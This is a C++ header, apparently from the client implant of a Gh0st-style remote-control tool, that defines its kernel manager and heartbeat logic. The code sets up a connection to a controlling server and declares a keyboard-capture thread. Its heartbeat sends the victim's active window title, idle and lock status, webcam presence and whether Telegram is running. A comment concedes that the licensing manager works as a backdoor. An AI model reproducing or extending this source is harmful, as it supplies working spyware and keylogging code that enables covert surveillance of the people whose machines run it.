// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_)
#define AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include <vector>

#define MAX_THREADNUM 0x1000>>2

#include <iostream>
#include <string>
#include <iomanip>
#include <TlHelp32.h>
#include "LoginServer.h"

// 根据配置决定采用什么通讯协议
IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect = false);

ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP);

class ActivityWindow
{
public:
    std::string Check(DWORD threshold_ms = 6000)
    {
        auto idle = GetUserIdleTime();
        BOOL isActive = (idle < threshold_ms);
        if (isActive) {
            return GetActiveWindowTitle();
        }
        return (!IsWorkstationLocked() ? "Inactive: " : "Locked: ") + FormatMilliseconds(idle);
    }

private:
    std::string FormatMilliseconds(DWORD ms)
    {
        DWORD totalSeconds = ms / 1000;
        DWORD hours = totalSeconds / 3600;
        DWORD minutes = (totalSeconds % 3600) / 60;
        DWORD seconds = totalSeconds % 60;

        std::stringstream ss;
        ss << std::setfill('0')
           << std::setw(2) << hours << ":"
           << std::setw(2) << minutes << ":"
           << std::setw(2) << seconds;

        return ss.str();
    }

    std::string GetActiveWindowTitle()
    {
        HWND hForegroundWindow = GetForegroundWindow();
        if (hForegroundWindow == NULL)
            return "No active window";

        char windowTitle[256];
        GetWindowTextA(hForegroundWindow, windowTitle, sizeof(windowTitle));
        return std::string(windowTitle);
    }

    DWORD GetLastInputTime()
    {
        LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
        GetLastInputInfo(&lii);
        return lii.dwTime;
    }

    DWORD GetUserIdleTime()
    {
        return (GetTickCount64() - GetLastInputTime());
    }

    bool IsWorkstationLocked()
    {
        HDESK hInput = OpenInputDesktop(0, FALSE, GENERIC_READ);
        // 如果无法打开桌面，可能是因为桌面已经切换到 Winlogon
        if (!hInput) return true;
        char name[256] = {0};
        DWORD needed;
        bool isLocked = false;
        if (GetUserObjectInformationA(hInput, UOI_NAME, name, sizeof(name), &needed)) {
            isLocked = (_stricmp(name, "Winlogon") == 0);
        }
        CloseDesktop(hInput);
        return isLocked;
    }
};

struct RttEstimator {
    double srtt = 0.0;       // 平滑 RTT (秒)
    double rttvar = 0.0;     // RTT 波动 (秒)
    double rto = 0.0;        // 超时时间 (秒)
    bool initialized = false;

    void update_from_sample(double rtt_ms)
    {
        const double alpha = 1.0 / 8;
        const double beta = 1.0 / 4;

        // 转换成秒
        double rtt = rtt_ms / 1000.0;

        if (!initialized) {
            srtt = rtt;
            rttvar = rtt / 2.0;
            rto = srtt + 4.0 * rttvar;
            initialized = true;
        } else {
            rttvar = (1.0 - beta) * rttvar + beta * std::fabs(srtt - rtt);
            srtt = (1.0 - alpha) * srtt + alpha * rtt;
            rto = srtt + 4.0 * rttvar;
        }

        // 限制最小 RTO（RFC 6298 推荐 1 秒）
        if (rto < 1.0) rto = 1.0;
    }
};

class CKernelManager : public CManager
{
public:
    CONNECT_ADDRESS* m_conn;
    HINSTANCE m_hInstance;
    CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb, State& s);
    virtual ~CKernelManager();
    VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
	virtual VOID OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength);
    ThreadInfo* m_hKeyboard;
    ThreadInfo  m_hThread[MAX_THREADNUM];
    // 此值在原代码中是用于记录线程数量；当线程数量超出限制时m_hThread会越界而导致程序异常
    // 因此我将此值的含义修改为"可用线程下标"，代表数组m_hThread中所指位置可用，即创建新的线程放置在该位置
    ULONG   m_ulThreadCount;
    UINT	GetAvailableIndex();
    State& g_bExit; // Hide base class variable
    static int g_IsAppExit;
    MasterSettings m_settings;
    RttEstimator m_nNetPing; // 网络状况
    // 发送心跳
    virtual int SendHeartbeat()
    {
        for (int i = 0; i < m_settings.ReportInterval && !g_bExit && m_ClientObject->IsConnected(); ++i)
            Sleep(1000);
        if (m_settings.ReportInterval <= 0) { // 关闭上报信息（含心跳）
            for (int i = rand() % 120; i && !g_bExit && m_ClientObject->IsConnected()&& m_settings.ReportInterval <= 0; --i)
                Sleep(1000);
            return 0;
        }
        if (g_bExit || !m_ClientObject->IsConnected())
            return -1;

        ActivityWindow checker;
        auto s = checker.Check();
        Heartbeat a(s, m_nNetPing.srtt);

        a.HasSoftware = SoftwareCheck(m_settings.DetectSoftware);

        BYTE buf[sizeof(Heartbeat) + 1];
        buf[0] = TOKEN_HEARTBEAT;
        memcpy(buf + 1, &a, sizeof(Heartbeat));
        m_ClientObject->Send2Server((char*)buf, sizeof(buf));
        return 0;
    }
    bool SoftwareCheck(int type)
    {
        static std::map<int, std::string> m = {
            {SOFTWARE_CAMERA, "摄像头"},
            {SOFTWARE_TELEGRAM, "telegram.exe" },
        };
        static bool hasCamera = WebCamIsExist();
        return type == SOFTWARE_CAMERA ? hasCamera : IsProcessRunning({ m[type] });
    }
    // 检查进程是否正在运行
    bool IsProcessRunning(const std::vector<std::string>& processNames)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // 获取当前系统中所有进程的快照
        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE)
            return true;

        // 遍历所有进程
        if (Process32First(hProcessSnap, &pe32)) {
            do {
                for (const auto& processName : processNames) {
                    // 如果进程名称匹配，则返回 true
                    if (_stricmp(pe32.szExeFile, processName.c_str()) == 0) {
                        SAFE_CLOSE_HANDLE(hProcessSnap);
                        return true;
                    }
                }
            } while (Process32Next(hProcessSnap, &pe32));
        }

        SAFE_CLOSE_HANDLE(hProcessSnap);
        return false;
    }
    virtual uint64_t GetClientID() const override
    {
        return m_conn->clientID;
    }
};

// [IMPORTANT]
// 授权管理器: 用于处理授权相关的心跳和响应，一旦授权成功则此线程将主动退出，不再和主控进行数据交互.
// 如果授权不成功则继续保持和主控的连接，包括进行必要的数据交互，这可能被定义为“后门”，但这是必须的.
// 注意: 授权管理器和普通的内核管理器在心跳包的处理上有所不同，授权管理器会在心跳包中附加授权相关的信息.
// 任何试图通过修改此类取消授权检查的行为都是不被允许的，并且不会成功，甚至可能引起程序强制退出.
class AuthKernelManager : public CKernelManager
{
public:
	bool m_bFirstHeartbeat = true;

    AuthKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb, State& s)
        : CKernelManager(conn, ClientObject, hInstance, kb, s)
    {
    }
    virtual ~AuthKernelManager() {}

    virtual int SendHeartbeat()override;

    virtual VOID OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength)override;
};

#endif // !defined(AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_)
